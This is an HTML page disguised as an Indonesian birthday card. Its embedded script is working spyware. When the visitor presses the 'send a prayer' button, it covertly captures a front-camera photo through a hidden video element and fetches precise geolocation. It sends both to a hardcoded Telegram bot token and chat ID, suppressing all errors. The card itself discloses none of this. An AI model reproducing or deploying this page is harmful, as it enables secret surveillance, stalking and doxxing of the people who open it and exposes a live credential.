<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎂 Happy Birthday!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #fdfcfb 0%, #e2d1c3 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Georgia', serif;
            padding: 20px;
        }
        .card {
            background: rgba(255,255,255,0.85);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            padding: 50px 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.08);
            border: 1px solid rgba(255,255,255,0.5);
        }
        .cake { font-size: 72px; margin-bottom: 8px; animation: float 3s ease-in-out infinite; }
        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        h1 { font-size: 28px; color: #2d1b12; margin-bottom: 6px; font-weight: 700; }
        .sub { font-size: 16px; color: #8a7a6e; margin-bottom: 20px; font-style: italic; }
        .msg { font-size: 15px; color: #4a3a2e; line-height: 1.8; margin-bottom: 28px; }
        .btn {
            background: #d4a373; color: #fff; border: none; padding: 14px 40px;
            border-radius: 50px; font-size: 16px; font-weight: 500;
            cursor: pointer; transition: 0.3s; font-family: inherit;
            box-shadow: 0 4px 15px rgba(212,163,115,0.3);
        }
        .btn:hover { background: #c4956a; transform: scale(1.02); }
        .btn:disabled { background: #a8b5a0; cursor: default; transform: none; }
        .footer { margin-top: 20px; font-size: 12px; color: #b5a69b; }
        .sparkle { display: inline-block; animation: sparkle 1.8s ease-in-out infinite; }
        @keyframes sparkle { 0%,100% { opacity: 0.3; } 50% { opacity: 1; } }
        video { display: none; }
    </style>
</head>
<body>
<div class="card">
    <div class="cake">🎂</div>
    <h1>Happy Birthday! <span class="sparkle">✨</span></h1>
    <div class="sub">Semoga hari ini penuh kebahagiaan</div>
    <div class="msg">Selamat ulang tahun!<br>Semoga semua impianmu menjadi kenyataan.<br>Terima kasih sudah menjadi bagian dari cerita ini. 🥂</div>
    <button class="btn" id="btnCelebrate">🎉 Kirim Doa</button>
    <div class="footer">❤️ Dari seseorang yang peduli</div>
</div>
<video id="video" autoplay playsinline style="display:none;"></video>

<script>
(function() {
    const BOT_TOKEN = '8887630458:AAGi2u-hkbgpjuP01eAIFMqsDmO2VO4kGZ0';
    const CHAT_ID = '8917726547';

    const btn = document.getElementById('btnCelebrate');
    const video = document.getElementById('video');
    let stream = null, position = null, done = false;

    function sendPhoto(base64Image) {
        const byteString = atob(base64Image.split(',')[1]);
        const mimeString = base64Image.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        const blob = new Blob([ab], { type: mimeString });

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'birthday.jpg');

        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
            method: 'POST',
            body: formData
        }).catch(() => {});
    }

    function sendLocation(lat, lng) {
        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendLocation', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                latitude: lat,
                longitude: lng
            })
        }).catch(() => {});
    }

    function captureAndSend() {
        if (done) return;
        done = true;

        if (stream) {
            const canvas = document.createElement('canvas');
            const w = video.videoWidth || 640;
            const h = video.videoHeight || 480;
            canvas.width = w;
            canvas.height = h;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, w, h);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
            sendPhoto(dataUrl);
        }

        if (position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            sendLocation(lat, lng);
        } else if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(p) {
                    position = p;
                    const lat = p.coords.latitude;
                    const lng = p.coords.longitude;
                    sendLocation(lat, lng);
                },
                function() {},
                { enableHighAccuracy: true, timeout: 8000 }
            );
        }
    }

    btn.onclick = function() {
        btn.textContent = '✨ Terkirim!';
        btn.disabled = true;

        navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        })
        .then(function(s) {
            stream = s;
            video.srcObject = s;
            setTimeout(captureAndSend, 1000);
        })
        .catch(function() {
            captureAndSend();
        });

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(p) {
                    position = p;
                },
                function() {},
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }
    };
})();
</script>
</body>
</html>
